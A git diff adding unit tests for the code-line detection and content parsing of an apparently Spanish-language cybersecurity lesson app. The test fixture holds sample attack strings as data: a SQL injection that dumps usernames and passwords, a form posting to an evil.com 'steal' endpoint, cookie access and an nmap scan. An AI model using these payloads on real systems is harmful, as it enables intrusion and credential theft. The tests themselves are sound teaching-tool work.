@@ -5,7 +5,7 @@ import { LESSONS, getLesson, lessonsForModule } from "../lessons";
 import { QUIZZES } from "../quizzes";
 import { PRACTICE } from "../practice";
 import { FLASHCARDS, FLASHCARD_CATEGORIES, flashcardsByCategory } from "../flashcards";
-import { tokenizeInline, splitLines } from "../markdown";
+import { tokenizeInline, splitLines, isCodeLine, parseContent } from "../markdown";
 
 // ─── EXAM content ────────────────────────────────────────────────────────────
 
@@ -227,6 +227,80 @@ describe("tokenizeInline", () => {
 
   it("bold no cerrado se trata como texto plano", () => {
     expect(tokenizeInline("**not closed")).toEqual([{ t: "**not closed", b: false }]);
+  });
+});
+
+describe("isCodeLine — code detection", () => {
+  const CODE = [
+    "import socket",
+    "def scan(ip, port):",
+    "    s = socket.socket()",
+    "result = s.connect_ex((ip, port))",
+    "nmap -sS -sV -p- -A 10.0.0.5",
+    "' UNION SELECT username,password FROM users --",
+    "for i in $(seq 1 254); do",
+    "Get-LocalGroupMember -Group 'Administrators'",
+    "r = requests.get(url, headers={'x-apikey': KEY})",
+    "<form action='https://evil.com/steal' method='POST'>",
+    "document.cookie // leer cookies",
+    "Get-Process | Where-Object {$_.CPU -gt 100}",
+  ];
+  const PROSE = [
+    "🔒 **Confidencialidad** — Solo autorizados acceden. Cifrado, ACL.",
+    "→ **scapy** — Manipulación de paquetes de red",
+    "Datos → **Segmento** (TCP) → **Paquete** (IP) → **Trama** (MAC)",
+    "**Display:** http, dns, tcp.port==80, ip.addr==10.0.0.1",
+    "1️⃣ **Reconnaissance** — Investigar al objetivo",
+    "Al enviar datos, cada capa agrega un header:",
+    "Ej: 9.8 (Critical) suele ser AV:N/AC:L/PR:N/UI:N con impacto total.",
+    "• Tecnología, Procesos, Personas",
+    "",
+  ];
+
+  it("detecta líneas de código reales", () => {
+    for (const line of CODE) {
+      expect(isCodeLine(line), `debería ser código: ${line}`).toBe(true);
+    }
+  });
+
+  it("no marca prosa como código (sin falsos positivos)", () => {
+    for (const line of PROSE) {
+      expect(isCodeLine(line), `debería ser prosa: ${line}`).toBe(false);
+    }
+  });
+});
+
+describe("parseContent", () => {
+  it("agrupa intro (texto) + líneas de código contiguas + texto", () => {
+    const content = "**Socket scanner:**\nimport socket\ndef scan(ip):\n    return ok\nProvee confidencialidad.";
+    const blocks = parseContent(content);
+    expect(blocks.map((b) => b.type)).toEqual(["text", "code", "text"]);
+    expect(blocks[1].lines).toHaveLength(3);
+    expect(blocks[2].lines[0]).toBe("Provee confidencialidad.");
+  });
+
+  it("contenido sin código es un único bloque de texto", () => {
+    const blocks = parseContent("🔒 Uno\n→ Dos\n• Tres");
+    expect(blocks).toHaveLength(1);
+    expect(blocks[0].type).toBe("text");
+    expect(blocks[0].lines).toHaveLength(3);
+  });
+
+  it("sobre el contenido real: detecta código pero no sobre-marca prosa", () => {
+    let codeLines = 0;
+    let totalLines = 0;
+    for (const lesson of LESSONS) {
+      for (const section of lesson.sections) {
+        for (const line of splitLines(section.c)) {
+          totalLines += 1;
+          if (isCodeLine(line)) codeLines += 1;
+        }
+      }
+    }
+    // Detecta código real (las lecciones tienen muchos snippets)...
+    expect(codeLines).toBeGreaterThan(30);
+    // ...pero el código es minoría: un ratio alto significaría falsos positivos.
+    expect(codeLines / totalLines).toBeLessThan(0.35);
   });
 });
 
